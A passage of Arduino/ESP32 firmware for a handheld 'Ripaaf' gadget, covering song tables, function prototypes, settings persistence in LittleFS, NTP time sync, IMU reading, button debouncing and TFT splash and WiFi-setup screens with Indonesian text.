  NOTE_G5,2, REST,4
};

static const int tempoPirates = 120;
static const int16_t melodyPirates[] PROGMEM = {
  NOTE_E4,8, NOTE_G4,8, NOTE_A4,4, NOTE_A4,8, REST,8,
  NOTE_A4,8, NOTE_B4,8, NOTE_C5,4, NOTE_C5,8, REST,8,
  NOTE_C5,8, NOTE_D5,8, NOTE_B4,4, NOTE_B4,8, REST,8,
  NOTE_A4,8, NOTE_G4,8, NOTE_A4,4, REST,8,
  NOTE_E4,8, NOTE_G4,8, NOTE_A4,4, NOTE_A4,8, REST,8,
  NOTE_A4,8, NOTE_B4,8, NOTE_C5,4, NOTE_C5,8, REST,8,
  NOTE_C5,8, NOTE_D5,8, NOTE_B4,4, NOTE_B4,8, REST,8,
  NOTE_A4,8, NOTE_G4,8, NOTE_A4,4, REST,8,
  NOTE_E4,8, NOTE_G4,8, NOTE_A4,4, NOTE_A4,8, REST,8,
  NOTE_A4,8, NOTE_C5,8, NOTE_D5,4, NOTE_D5,8, REST,8,
  NOTE_D5,8, NOTE_E5,8, NOTE_F5,4, NOTE_F5,8, REST,8,
  NOTE_E5,8, NOTE_D5,8, NOTE_E5,8, NOTE_A4,4, REST,8,
  NOTE_A4,8, NOTE_B4,8, NOTE_C5,4, NOTE_C5,8, REST,8,
  NOTE_D5,4, NOTE_E5,8, NOTE_A4,4, REST,8,
  NOTE_A4,8, NOTE_C5,8, NOTE_B4,4, NOTE_B4,8, REST,8,
  NOTE_C5,8, NOTE_A4,8, NOTE_B4,4, REST,4,
  NOTE_A4,4, NOTE_A4,8,
  NOTE_A4,8, NOTE_B4,8, NOTE_C5,4, NOTE_C5,8, REST,8,
  NOTE_C5,8, NOTE_D5,8, NOTE_B4,4, NOTE_B4,8, REST,8,
  NOTE_A4,8, NOTE_G4,8, NOTE_A4,4, REST,8,
  NOTE_E4,8, NOTE_G4,8, NOTE_A4,4, NOTE_A4,8, REST,8,
  NOTE_A4,8, NOTE_B4,8, NOTE_C5,4, NOTE_C5,8, REST,8,
  NOTE_C5,8, NOTE_D5,8, NOTE_B4,4, NOTE_B4,8, REST,8,
  NOTE_A4,8, NOTE_G4,8, NOTE_A4,4, REST,8,
  NOTE_E4,8, NOTE_G4,8, NOTE_A4,4, NOTE_A4,8, REST,8,
  NOTE_A4,8, NOTE_C5,8, NOTE_D5,4, NOTE_D5,8, REST,8,
  NOTE_D5,8, NOTE_E5,8, NOTE_F5,4, NOTE_F5,8, REST,8,
  NOTE_E5,8, NOTE_D5,8, NOTE_E5,8, NOTE_A4,4, REST,8,
  NOTE_A4,8, NOTE_B4,8, NOTE_C5,4, NOTE_C5,8, REST,8,
  NOTE_D5,4, NOTE_E5,8, NOTE_A4,4, REST,8,
  NOTE_A4,8, NOTE_C5,8, NOTE_B4,4, NOTE_B4,8, REST,8,
  NOTE_C5,8, NOTE_A4,8, NOTE_B4,4, REST,4,
  NOTE_E5,4, REST,8, REST,4, NOTE_F5,4, REST,8, REST,4,
  NOTE_E5,8, NOTE_E5,8, REST,8, NOTE_G5,8, REST,8, NOTE_E5,8, NOTE_D5,8, REST,8, REST,4,
  NOTE_D5,4, REST,8, REST,4, NOTE_C5,4, REST,8, REST,4,
  NOTE_B4,8, NOTE_C5,8, REST,8, NOTE_B4,8, REST,8, NOTE_A4,2,
  NOTE_E5,4, REST,8, REST,4, NOTE_F5,4, REST,8, REST,4,
  NOTE_E5,8, NOTE_E5,8, REST,8, NOTE_G5,8, REST,8, NOTE_E5,8, NOTE_D5,8, REST,8, REST,4,
  NOTE_D5,4, REST,8, REST,4, NOTE_C5,4, REST,8, REST,4,
  NOTE_B4,8, NOTE_C5,8, REST,8, NOTE_B4,8, REST,8, NOTE_A4,2
};

static const char melodyClassicNotes[] PROGMEM = "GGAGcB GGAGdc GGxecBA yyecdc";
static const uint8_t melodyClassicBeats[] PROGMEM = {2,2,8,8,8,16,1,2,2,8,8,8,16,1,2,2,8,8,8,8,16,1,2,2,8,8,8,16};
static const int tempoClassic = 200;

static bool songPlaying = false;
static SongId currentSong = SONG_ID_PINK;
static SongType currentSongType = SONG_TYPE_MELODY;
static const int16_t *currentSongMelody = melodyPinkPanther;
static int currentSongMelodyLength = sizeof(melodyPinkPanther) / sizeof(melodyPinkPanther[0]);
static const char *currentSongNotes = melodyClassicNotes;
static const uint8_t *currentSongBeats = melodyClassicBeats;
static uint8_t currentSongTextLength = sizeof(melodyClassicBeats) / sizeof(melodyClassicBeats[0]);
static int currentSongTempo = tempoPinkPanther;
static int wholenote = (60000 * 4) / tempoPinkPanther;
static int songIndex = 0;
static uint32_t noteEndMs = 0;
static uint32_t pauseEndMs = 0;
static bool noteOnPhase = false;

// =========================================================
// GIF
// =========================================================
static AnimatedGIF gif;
static File gifFsFile;
static bool gifPlaying = false;
static String gifLastError = "";
static uint32_t gifLinesDrawn = 0;
static bool gifScreenCleared = false;
static uint32_t lastGifReopenMs = 0;
static uint32_t lastGifFrameMs = 0;
static uint16_t gifFrameDelayMs = 20;

// =========================================================
// Water mode
// =========================================================
static const bool INVERT_ROLL = true;
static const bool INVERT_PITCH = false;
static bool waterMode = false;
static uint8_t water[8][8];
static uint8_t waterTmp[8][8];
static uint32_t lastWaterStepMs = 0;

// =========================================================
// Web / upload
// =========================================================
WebServer server(80);
static File uploadFile;
static String uploadTargetPath = "";
static bool uploadRejected = false;
static size_t uploadBytes = 0;
static bool fsReady = false;
static bool wifiLimitedMode = false;
static String savedWifiSsid = "";
static String savedWifiPass = "";
static bool wifiAutoConnectPending = false;
static bool wifiAutoConnectActive = false;
static uint32_t wifiAutoConnectStartMs = 0;
static const uint32_t WIFI_AUTO_CONNECT_TIMEOUT_MS = 4500;

// =========================================================
// Prototypes
// =========================================================
static void markTftDirty();
static String jsonEscape(const String &s);

static bool utcOffsetLoadFromFS();
static bool utcOffsetSaveToFS();
static void timeApplyTZ();
static void timeTrySyncNtp();
static String timeNowHHMM();
static String timeDisplayText();
static String fmtUtcOffset();
static const char *clockDisplayModeText(ClockDisplayMode mode);
static int utcOffsetIndexFromMinutes(int minutes);
static int utcOffsetNextIndex(int idx, int delta);
static bool wifiCredentialsLoadFromFS();
static bool wifiCredentialsSaveToFS(const String &ssid, const String &password);
static void wifiForgetCredentials();
static String wifiSettingsStatusText();
static void doNetworkInit();

static void blInit();
static void blApplyIfDirty();
static void blSet(uint8_t v);
static bool blLoadFromFS();
static bool blSaveToFS();

static bool brightnessLoadFromFS();
static bool brightnessSaveToFS();
static void applyBrightnessIfDirty();

static bool imuLoadFromFS();
static bool imuSaveToFS();
static bool sleepModeLoadFromFS();
static bool sleepModeSaveToFS();
static void QMI8658_SetEnabled(bool on);
static void writeReg(uint8_t reg, uint8_t val);
static bool readBlock(uint8_t startReg, uint8_t *buf, uint8_t len);
static bool QMI8658_Init();
static bool QMI8658_Loop();
static void computeTiltDeg(float &rollDeg, float &pitchDeg);
static const char *computeDirection(float rollDeg, float pitchDeg);
static bool uiSfxLoadFromFS();
static bool uiSfxSaveToFS();
static bool clockDisplayLoadFromFS();
static bool clockDisplaySaveToFS();
static bool buzzerVolLoadFromFS();
static bool buzzerVolSaveToFS();
static void buzzerTone(uint16_t freq, uint16_t durMs = 0);
static void buzzerNoTone();
static void uiPlayTone(uint16_t freq, uint16_t durMs);
static void uiPlayMoveTone();
static void uiPlayOkTone();
static void uiPlayBackTone();
static void uiPlayWakeTone();
static void uiPlaySplashTone();
static void gamePlayShootTone();
static void gamePlayEnemyHitTone();
static void gamePlayPlayerHitTone();
static void gamePlayLineTone();

static void buttonsInit();
static void btnUpdate(BtnState &b);
static bool okShortClick();
static bool okLongPress();

static void tftInitDisplay();
static void tftDrawSplash();
static void tftDrawWifiConfigHelp(const char *apName);
static void tftDrawWifiConfigFailed();
static bool tftDrawBmpFromFS(const char *path, int16_t x, int16_t y);
static bool tftDrawBmpFromFSScaled(const char *path, int16_t dstX, int16_t dstY, int16_t dstW, int16_t dstH);
static void tftDrawHeader(const char *title);
static void tftDrawTopRightDateTime(bool clearBg);
static uint8_t tftListFirstVisible(uint8_t selectedIndex, uint8_t itemCount, uint8_t visibleCount);
static void tftDrawListScrollbar(int16_t x, int16_t y, int16_t h, uint8_t itemCount, uint8_t visibleCount, uint8_t firstVisible);
static int16_t tftRightAlignTextX(const String &value, int16_t rightX, int16_t minX);
static void tftDrawIconMenu();
static void tftDrawMediaMenu();
static void tftDrawSettingsMenu();
static void tftDrawWifiListMenu();
static void tftDrawWifiKeyboard();
static void tftDrawSongMenu();
static void tftDrawToolsMenu();
static void tftDrawFileExplorer();
static void tftDrawFileAction();
static void tftDrawFileViewer();
static void tftRedrawFileList(uint8_t selectedIndex);
static void tftDrawMatrixTextMenu();
static void tftDrawTextKeyboard();
static void tftDrawNoteEditorMenu();
static void tftDrawNoteEditorMain();
static void tftDrawSleepStateNotice();
static void tftDrawStandbySleepScreen();
static void tftDrawBmpSleepClockScreen();
static void tftDrawGifSleepClockScreen();
static void tftRefreshSleepScreen();
static void tftDrawCalcTool();
static void tftDrawStopwatchTool();
static void tftDrawTimerTool();
static void tftDrawLampTool();
static void tftDrawValueScreen(const char *title, const String &value, int barValue, int vmin, int vmax);
static void tftDrawUtcScreen();
static void tftDrawFooterIp();
static void tftDrawBmpViewer();
static void tftDrawGifStartOrError();
static void tftDrawCameraStatus(const String &line1, const String &line2);
static void tftDrawGameMenu(bool force);
static void tftDrawShooterHud(bool force);
static void tftDrawTetrisHud(bool force);
static void tftDrawWaterHud(bool force);
static void tftEnterSleep();
static void tftExitSleep();
static bool sleepModeKeepsScreenOn(SleepMode mode);

static void matrixInit();
static void matrixClearBuffer();
static void matrixClear();
static void matrixShowIdleFace();
static void matrixCommitToPixels();
static void matrixEnterSleep();
static void matrixExitSleep();
static void matrixFillAll(CRGB col);
static void matrixApplyTemplate(MatrixTemplate t);
static MatrixTemplate parseTemplate(const String &s);
static int fromHex(char c);
static String hex2(uint8_t v);
static String matrixToHex384();
static bool matrixFromHex384(const String &s);
static bool matrixSaveToFS();
static bool matrixLoadFromFS();
static void matrixCaptureScene();
static void matrixRestoreScene();
static void matrixRenderGame();
static void matrixRenderTetris();
static void matrixStartText();
static void matrixTextLoop();
static void lampSetEnabled(bool on);
static void fileViewerLoadFromPath(const String &path);
static bool noteSaveByName(const String &name);
static bool noteLoadByName(const String &name);
static void noteStartPlay();
static void noteStopPlay();
static void noteLoop();

static void gameClearObjects();
static void gameReset();
static void gameEnterMenu();
static void gameStartShooter();
static void gameStop(bool backToUi);
static void gameLoop();
static void gameMoveShipFromGyro();
static void gameSpawnEnemyIfNeeded();
static void gameSpawnEnemyShotIfNeeded();
static void gameSpawnPlayerShotIfNeeded();
static void gameStepPlayerBullets();
static void gameStepEnemyBullets();
static void gameStepEnemies();
static void gameHandleCollisions();
static void gameDamagePlayer();
static void gameUpdateLevel();
static uint32_t gameSpawnIntervalMs();
static uint32_t gameEnemyStepIntervalMs();
static uint32_t gameEnemyBulletIntervalMs();
static uint32_t gamePlayerFireIntervalMs();

static void tetrisResetBoard();
static bool tetrisCanPlace(uint8_t pieceType, uint8_t rotation, int8_t x, int8_t y);
static void tetrisMergePiece();
static void tetrisSpawnPiece();
static void tetrisStart();
static void tetrisStop();
static void tetrisRotate(int dir);
static void tetrisMoveFromGyro();
static void tetrisClearLines();
static void tetrisLoop();

static void pongStart();
static void pongStop();
static void pongResetBall();
static void pongLoop();
static void tftDrawPongFrame(bool force);

static int calcNoteDurationMs(int divider);
static const char *songName(SongId id);
static void songSelect(SongId id);
static int songTextNoteToFreq(char note);
static void songStart();
static void songStartSelected(SongId id);
static void songStop();
static void songLoop();

static void *GIFOpenFile(const char *fname, int32_t *pSize);
static void GIFCloseFile(void *pHandle);
static int32_t GIFReadFile(GIFFILE *pFile, uint8_t *pBuf, int32_t iLen);
static int32_t GIFSeekFile(GIFFILE *pFile, int32_t iPosition);
static void GIFDraw(GIFDRAW *pDraw);
static void gifStop();
static bool gifStart();
static void gifLoopStep();

static void waterReset();
static void waterStep();

static void uiMarkDirty();
static void uiEnter(UiScreen screen);
static const char *sleepModeText(SleepMode mode);
static bool isSleepActive();
static const char *calcOpText(uint8_t op);
static int32_t calcResult();
static void calcAdjustValue(int delta);
static String formatStopwatchMs(uint32_t ms);
static void enterMode(AppMode mode);
static void exitToUi();
static void uiLoop();

static void wifiAutoConfig();
static void handleRoot();
static void handleStatus();
static void wifiScanAndShowList();
static bool wifiConnectSelectedNetwork();
static uint8_t wifiKeyboardRowCount();
static uint8_t wifiKeyboardRowSize(WifiKeyboardMode mode, uint8_t row);
static String wifiKeyboardLabel(WifiKeyboardMode mode, bool shift, uint8_t row, uint8_t col);
static void wifiKeyboardClampSelection();
static void wifiKeyboardMoveRow(int delta);
static void wifiKeyboardMoveCol(int delta);
static void wifiKeyboardActivate();
static void handleModeApi();
static void handleGameApi();
static void handleMatrixGetApi();
static void handleMatrixSetApi();
static void handleMatrixTemplateApi();
static void handleMatrixSaveApi();
static void handleMatrixLoadApi();
static void handleBrushApi();
static void handleBrightnessApi();
static void handleBacklightApi();
static void handleTftSleepApi();
static void handleTftWakeApi();
static void handleImuApi();
static void handleSongPlayApi();
static void handleSongStopApi();
static void handleWaterApi();
static void handleUploadStream();
static void handleUploadDone();
static void handleCameraUrlApi();
static void handleCameraCaptureApi();

static bool cameraUrlLoadFromFS();
static bool cameraUrlSaveToFS();
static void cameraStop();
static void cameraLoop();
static void cameraCaptureRequest();
static bool cameraConnectStream();
static bool cameraReadLine(String &out, uint32_t timeoutMs);
static bool cameraReadBytes(uint8_t *buf, size_t len, uint32_t timeoutMs);
static bool cameraParseUrl(const String &url, String &host, uint16_t &port, String &path);
static bool cameraBeginCapture(uint16_t w, uint16_t h);
static void cameraEndCapture();
static bool cameraJpgDraw(int16_t x, int16_t y, uint16_t w, uint16_t h, uint16_t *data);

// =========================================================
// Helpers
// =========================================================
static void markTftDirty() { tftDirty = true; }

static String jsonEscape(const String &s) {
  String out;
  out.reserve(s.length() + 8);
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '\\' || c == '"') {
      out += '\\';
      out += c;
    } else if (c == '\n') out += "\\n";
    else if (c == '\r') out += "\\r";
    else out += c;
  }
  return out;
}

static int utcOffsetIndexFromMinutes(int minutes) {
  for (int i = 0; i < kUtcOffsetsCount; i++) {
    if (kUtcOffsetsMin[i] == minutes) return i;
  }
  int bestIndex = 0;
  int bestDistance = abs(minutes - (int)kUtcOffsetsMin[0]);
  for (int i = 1; i < kUtcOffsetsCount; i++) {
    int distance = abs(minutes - (int)kUtcOffsetsMin[i]);
    if (distance < bestDistance) {
      bestDistance = distance;
      bestIndex = i;
    }
  }
  return bestIndex;
}

static int utcOffsetNextIndex(int idx, int delta) {
  int next = (idx + delta) % kUtcOffsetsCount;
  if (next < 0) next += kUtcOffsetsCount;
  return next;
}

static bool utcOffsetSaveToFS() {
  File f = LittleFS.open(UTC_OFFSET_PATH, "w");
  if (!f) return false;
  f.print(String(gUtcOffsetMinutes));
  f.close();
  return true;
}

static bool utcOffsetLoadFromFS() {
  if (!LittleFS.exists(UTC_OFFSET_PATH)) return false;
  File f = LittleFS.open(UTC_OFFSET_PATH, "r");
  if (!f) return false;
  String s = f.readStringUntil('\n');
  f.close();
  gUtcOffsetMinutes = constrain(s.toInt(), -12 * 60, 14 * 60);
  return true;
}

static void timeApplyTZ() {
  int off = gUtcOffsetMinutes;
  int hours = abs(off) / 60;
  int mins = abs(off) % 60;
  char tz[32];
  char sign = (off >= 0) ? '-' : '+';
  if (mins == 0) snprintf(tz, sizeof(tz), "UTC%c%d", sign, hours);
  else snprintf(tz, sizeof(tz), "UTC%c%d:%02d", sign, hours, mins);
  setenv("TZ", tz, 1);
  tzset();
}

static void timeTrySyncNtp() {
  uint32_t now = millis();
  if (now - lastTimeSyncAttemptMs < 5000) return;
  lastTimeSyncAttemptMs = now;
  if (!WiFi.isConnected()) return;
  configTime(gUtcOffsetMinutes * 60, 0, "pool.ntp.org", "time.nist.gov");
  struct tm tmNow;
  if (getLocalTime(&tmNow, 50)) {
    if (tmNow.tm_year + 1900 >= 2024) timeSynced = true;
  }
}

static String timeNowHHMM() {
  struct tm tmNow;
  if (!timeSynced) return String("--:--");
  if (!getLocalTime(&tmNow, 20)) return String("--:--");
  char buf[8];
  strftime(buf, sizeof(buf), "%H:%M", &tmNow);
  return String(buf);
}

static String timeDisplayText() {
  struct tm tmNow;
  char buf[20];
  if (!timeSynced || !getLocalTime(&tmNow, 20)) {
    if (clockDisplayMode == CLOCK_VIEW_DATE) return String("--/--/--");
    if (clockDisplayMode == CLOCK_VIEW_TIME_DATE) return String("--:-- --/--");
    return String("--:--");
  }
  if (clockDisplayMode == CLOCK_VIEW_DATE) {
    strftime(buf, sizeof(buf), "%d/%m/%y", &tmNow);
  } else if (clockDisplayMode == CLOCK_VIEW_TIME_DATE) {
    strftime(buf, sizeof(buf), "%H:%M %d/%m", &tmNow);
  } else {
    strftime(buf, sizeof(buf), "%H:%M", &tmNow);
  }
  return String(buf);
}

static String fmtUtcOffset() {
  int off = gUtcOffsetMinutes;
  char sign = (off >= 0) ? '+' : '-';
  int a = abs(off);
  char buf[10];
  snprintf(buf, sizeof(buf), "%c%02d:%02d", sign, a / 60, a % 60);
  return String(buf);
}

static void blInit() {
  pinMode(TFT_BLK, OUTPUT);
  blDirty = true;
  blApplyIfDirty();
}

static void blApplyIfDirty() {
  if (!blDirty) return;
  analogWrite(TFT_BLK, gTftBacklight);
  blDirty = false;
}

static void blSet(uint8_t v) {
  gTftBacklight = v;
  blDirty = true;
  blApplyIfDirty();
}

static bool blSaveToFS() {
  File f = LittleFS.open(TFT_BL_PATH, "w");
  if (!f) return false;
  f.print(String(gTftBacklight));
  f.close();
  return true;
}

static bool blLoadFromFS() {
  if (!LittleFS.exists(TFT_BL_PATH)) return false;
  File f = LittleFS.open(TFT_BL_PATH, "r");
  if (!f) return false;
  String s = f.readStringUntil('\n');
  f.close();
  gTftBacklight = (uint8_t)constrain(s.toInt(), 0, 255);
  blDirty = true;
  return true;
}

static bool brightnessSaveToFS() {
  File f = LittleFS.open(BRIGHTNESS_PATH, "w");
  if (!f) return false;
  f.print(String(gBrightness));
  f.close();
  return true;
}

static bool brightnessLoadFromFS() {
  if (!LittleFS.exists(BRIGHTNESS_PATH)) return false;
  File f = LittleFS.open(BRIGHTNESS_PATH, "r");
  if (!f) return false;
  String s = f.readStringUntil('\n');
  f.close();
  gBrightness = (uint8_t)constrain(s.toInt(), 0, 255);
  brightnessDirty = true;
  return true;
}

static void applyBrightnessIfDirty() {
  if (!brightnessDirty) return;
  FastLED.setBrightness(gBrightness);
  brightnessDirty = false;
}

static bool imuSaveToFS() {
  File f = LittleFS.open(IMU_ON_PATH, "w");
  if (!f) return false;
  f.print(imuOn ? "1" : "0");
  f.close();
  return true;
}

static bool imuLoadFromFS() {
  if (!LittleFS.exists(IMU_ON_PATH)) return false;
  File f = LittleFS.open(IMU_ON_PATH, "r");
  if (!f) return false;
  String s = f.readStringUntil('\n');
  f.close();
  imuOn = (s.toInt() != 0);
  return true;
}

static bool uiSfxSaveToFS() {
  File f = LittleFS.open(UI_SFX_PATH, "w");
  if (!f) return false;
  f.print(uiSfxEnabled ? "1" : "0");
  f.close();
  return true;
}

static bool uiSfxLoadFromFS() {
  if (!LittleFS.exists(UI_SFX_PATH)) return false;
  File f = LittleFS.open(UI_SFX_PATH, "r");
  if (!f) return false;
  String s = f.readStringUntil('\n');
  f.close();
  uiSfxEnabled = (s.toInt() != 0);
  return true;
}

static bool clockDisplaySaveToFS() {
  File f = LittleFS.open(CLOCK_VIEW_PATH, "w");
  if (!f) return false;
  f.print(String((int)clockDisplayMode));
  f.close();
  return true;
}

static bool clockDisplayLoadFromFS() {
  if (!LittleFS.exists(CLOCK_VIEW_PATH)) return false;
  File f = LittleFS.open(CLOCK_VIEW_PATH, "r");
  if (!f) return false;
  String s = f.readStringUntil('\n');
  f.close();
  int value = constrain(s.toInt(), 0, 2);
  clockDisplayMode = (ClockDisplayMode)value;
  return true;
}

static bool wifiCredentialsSaveToFS(const String &ssid, const String &password) {
  File fs = LittleFS.open(WIFI_SSID_PATH, "w");
  if (!fs) return false;
  fs.print(ssid);
  fs.close();
  File fp = LittleFS.open(WIFI_PASS_PATH, "w");
  if (!fp) return false;
  fp.print(password);
  fp.close();
  savedWifiSsid = ssid;
  savedWifiPass = password;
  return true;
}

static bool wifiCredentialsLoadFromFS() {
  savedWifiSsid = "";
  savedWifiPass = "";
  if (!LittleFS.exists(WIFI_SSID_PATH)) return false;
  File fs = LittleFS.open(WIFI_SSID_PATH, "r");
  if (!fs) return false;
  savedWifiSsid = fs.readStringUntil('\n');
  fs.close();
  savedWifiSsid.trim();
  if (LittleFS.exists(WIFI_PASS_PATH)) {
    File fp = LittleFS.open(WIFI_PASS_PATH, "r");
    if (fp) {
      savedWifiPass = fp.readStringUntil('\n');
      fp.close();
      savedWifiPass.trim();
    }
  }
  return savedWifiSsid.length() > 0;
}

static void wifiForgetCredentials() {
  savedWifiSsid = "";
  savedWifiPass = "";
  if (LittleFS.exists(WIFI_SSID_PATH)) LittleFS.remove(WIFI_SSID_PATH);
  if (LittleFS.exists(WIFI_PASS_PATH)) LittleFS.remove(WIFI_PASS_PATH);
  WiFi.disconnect(false, true);
  wifiLimitedMode = true;
}

static String wifiSettingsStatusText() {
  if (WiFi.isConnected()) return String("CONNECTED");
  if (savedWifiSsid.length() > 0) return String("SAVED");
  if (wifiLimitedMode) return String("OFFLINE");
  return String("NO WIFI");
}

static bool sleepModeSaveToFS() {
  File f = LittleFS.open(SLEEP_MODE_PATH, "w");
  if (!f) return false;
  f.print(String((int)sleepMode));
  f.close();
  return true;
}

static bool sleepModeLoadFromFS() {
  if (!LittleFS.exists(SLEEP_MODE_PATH)) return false;
  File f = LittleFS.open(SLEEP_MODE_PATH, "r");
  if (!f) return false;
  String s = f.readStringUntil('\n');
  f.close();
  int value = constrain(s.toInt(), 0, 4);
  sleepMode = (SleepMode)value;
  return true;
}

static bool buzzerVolSaveToFS() {
  File f = LittleFS.open(BUZZER_VOL_PATH, "w");
  if (!f) return false;
  f.print(String(buzzerVolume));
  f.close();
  return true;
}

static bool buzzerVolLoadFromFS() {
  if (!LittleFS.exists(BUZZER_VOL_PATH)) return false;
  File f = LittleFS.open(BUZZER_VOL_PATH, "r");
  if (!f) return false;
  String s = f.readStringUntil('\n');
  f.close();
  buzzerVolume = (uint8_t)constrain(s.toInt(), 0, 10);
  return true;
}

static void buzzerTone(uint16_t freq, uint16_t durMs) {
  if (buzzerVolume == 0) { noTone(BUZZER_PIN); return; }
  tone(BUZZER_PIN, freq, durMs);
  if (buzzerVolume < 10) {
    ledcWrite(BUZZER_PIN, (uint32_t)511 * buzzerVolume / 10);
  }
}

static void buzzerNoTone() {
  noTone(BUZZER_PIN);
}

static void uiPlayTone(uint16_t freq, uint16_t durMs) {
  if (!uiSfxEnabled || songPlaying) return;
  buzzerTone(freq, durMs);
}

static void uiPlayMoveTone() { uiPlayTone(1760, 18); }
static void uiPlayOkTone() { uiPlayTone(2200, 26); }
static void uiPlayBackTone() { uiPlayTone(1320, 32); }
static void uiPlayWakeTone() { uiPlayTone(2480, 34); }

static void uiPlaySplashTone() {
  if (!uiSfxEnabled || songPlaying) return;
  buzzerTone(1319, 70);
  delay(85);
  buzzerTone(1760, 80);
  delay(95);
  buzzerTone(2093, 110);
  delay(125);
}

static void gamePlayShootTone() { uiPlayTone(2480, 10); }
static void gamePlayEnemyHitTone() { uiPlayTone(1568, 24); }
static void gamePlayPlayerHitTone() { uiPlayTone(220, 70); }
static void gamePlayLineTone() { uiPlayTone(1976, 45); }

static void writeReg(uint8_t reg, uint8_t val) {
  Wire.beginTransmission(QMI8658_ADDR);
  Wire.write(reg);
  Wire.write(val);
  Wire.endTransmission();
}

static bool readBlock(uint8_t startReg, uint8_t *buf, uint8_t len) {
  Wire.beginTransmission(QMI8658_ADDR);
  Wire.write(startReg);
  if (Wire.endTransmission(false) != 0) return false;
  Wire.requestFrom(QMI8658_ADDR, len);
  if (Wire.available() < (int)len) return false;
  for (uint8_t i = 0; i < len; i++) buf[i] = Wire.read();
  return true;
}

static bool QMI8658_Init() {
  Wire.begin(I2C_SDA, I2C_SCL);
  delay(20);
  writeReg(0x60, 0xB0);
  delay(50);
  writeReg(0x02, 0x60);
  writeReg(0x03, 0x40);
  writeReg(0x08, 0x03);
  delay(10);
  return true;
}

static void QMI8658_SetEnabled(bool on) {
  if (on) {
    writeReg(0x08, 0x03);
    delay(10);
    imuOn = true;
  } else {
    writeReg(0x08, 0x00);
    delay(10);
    imuOn = false;
    if (waterMode) {
      waterMode = false;
      matrixDirty = true;
    }
  }
}

static bool QMI8658_Loop() {
  if (!imuOn) return false;
  uint8_t b[12];
  if (!readBlock(0x35, b, 12)) return false;
  auto rd16 = [&](int i) -> int16_t { return (int16_t)((uint16_t)b[i] | ((uint16_t)b[i + 1] << 8)); };
  int16_t ax = rd16(0), ay = rd16(2), az = rd16(4);
  int16_t gx = rd16(6), gy = rd16(8), gz = rd16(10);
  const float accLsbPerG = 8192.0f;
  const float gyrLsbPerDps = 64.0f;
  Accel.x = (float)ax / accLsbPerG;
  Accel.y = (float)ay / accLsbPerG;
  Accel.z = (float)az / accLsbPerG;
  Gyro.x = (float)gx / gyrLsbPerDps;
  Gyro.y = (float)gy / gyrLsbPerDps;
  Gyro.z = (float)gz / gyrLsbPerDps;
  return true;
}

static void computeTiltDeg(float &rollDeg, float &pitchDeg) {
  float r = atan2f(Accel.y, Accel.z) * 57.2957795f;
  float p = atan2f(-Accel.x, sqrtf(Accel.y * Accel.y + Accel.z * Accel.z)) * 57.2957795f;
  if (INVERT_ROLL) r = -r;
  if (INVERT_PITCH) p = -p;
  rollDeg = r;
  pitchDeg = p;
}

static const char *computeDirection(float rollDeg, float pitchDeg) {
  const float threshold = 12.0f;
  bool up = pitchDeg > threshold;
  bool down = pitchDeg < -threshold;
  bool right = rollDeg > threshold;
  bool left = rollDeg < -threshold;
  if (!(up || down || right || left)) return "FLAT";
  return (fabsf(pitchDeg) >= fabsf(rollDeg)) ? (up ? "UP" : "DOWN") : (right ? "RIGHT" : "LEFT");
}

static void buttonsInit() {
  pinMode(BTN_UP_PIN, INPUT_PULLUP);
  pinMode(BTN_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_OK_PIN, INPUT_PULLUP);
}

static bool readPressed(uint8_t pin) { return digitalRead(pin) == LOW; }

static void btnUpdate(BtnState &b) {
  bool raw = readPressed(b.pin);
  uint32_t now = millis();
  if (raw != b.stable) {
    if (now - b.lastChangeMs >= DEBOUNCE_MS) {
      b.lastStable = b.stable;
      b.stable = raw;
      b.lastChangeMs = now;
      b.pressEvent = (!b.lastStable && b.stable);
      b.releaseEvent = (b.lastStable && !b.stable);
      if (b.pressEvent) {
        b.pressStartMs = now;
        b.longFired = false;
      }
    }
  } else {
    b.pressEvent = false;
    b.releaseEvent = false;
  }
  if (b.stable && !b.longFired && (now - b.pressStartMs >= LONGPRESS_MS)) {
    b.longFired = true;
  }
}

static bool okShortClick() { return btnOk.releaseEvent && !btnOk.longFired; }

static bool okLongPress() {
  static bool prev = false;
  bool now = btnOk.longFired && btnOk.stable;
  bool fired = now && !prev;
  prev = now;
  if (!btnOk.stable) prev = false;
  return fired;
}

static void tftInitDisplay() {
  SPI.begin(TFT_SCLK, -1, TFT_MOSI, TFT_CS);
  tft.init(240, 240, SPI_MODE3);
  tft.setRotation(3);
  tft.cp437(true);
  tft.fillScreen(UI_BG);
}

static void tftDrawSplash() {
  tft.fillScreen(0x0000);
  for (int y = 0; y < 240; y += 12) {
    uint16_t band = (y % 24 == 0) ? 0x0841 : 0x1082;
    tft.fillRect(0, y, 240, 12, band);
  }
  tft.drawRoundRect(18, 40, 204, 150, 16, UI_ACCENT);
  tft.drawRoundRect(24, 46, 192, 138, 14, UI_LINE);
  tft.setTextWrap(false);
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(72, 66);
  tft.print("booting");
  tft.setTextSize(4);
  tft.setTextColor(UI_LINE);
  tft.setCursor(37, 99);
  tft.print("Ripaaf");
  tft.setTextColor(UI_WARN);
  tft.setCursor(35, 97);
  tft.print("Ripaaf");
  tft.setTextColor(UI_ACCENT);
  tft.setCursor(33, 95);
  tft.print("Ripaaf");
  tft.drawFastHLine(52, 150, 136, UI_OK);
  tft.setTextSize(1);
  tft.setTextColor(UI_TEXT);
  tft.setCursor(58, 164);
  tft.print("Starting...");
  uiPlaySplashTone();
  delay(1400);
}

static void tftDrawWifiConfigHelp(const char *apName) {
  tft.fillScreen(UI_BG);
  tft.setTextWrap(false);
  tft.setTextColor(UI_TEXT);
  tft.setTextSize(2);
  tft.setCursor(12, 12);
  tft.print("WiFi Setup");
  tft.drawFastHLine(10, 36, 220, UI_LINE);
  tft.setTextSize(2);
  tft.setTextColor(UI_ACCENT);
  tft.setCursor(18, 56);
  tft.print("WiFi belum diset");
  tft.setTextSize(1);
  tft.setTextColor(UI_TEXT);
  tft.setCursor(18, 92);
  tft.print("1. Sambung HP ke AP:");
  tft.setTextColor(UI_OK);
  tft.setCursor(30, 108);
  tft.print(apName && apName[0] ? apName : "Ripa-Setup");
  tft.setTextColor(UI_TEXT);
  tft.setCursor(18, 132);
  tft.print("2. Buka 192.168.4.1");
  tft.setCursor(18, 148);
  tft.print("3. Pilih WiFi, isi pass");
  tft.setCursor(18, 164);
  tft.print("4. Simpan, device lanjut boot");
  tft.setTextColor(UI_MUTED);
  tft.setCursor(18, 188);
  tft.print("OK: lanjut dulu");
  tft.setCursor(18, 204);
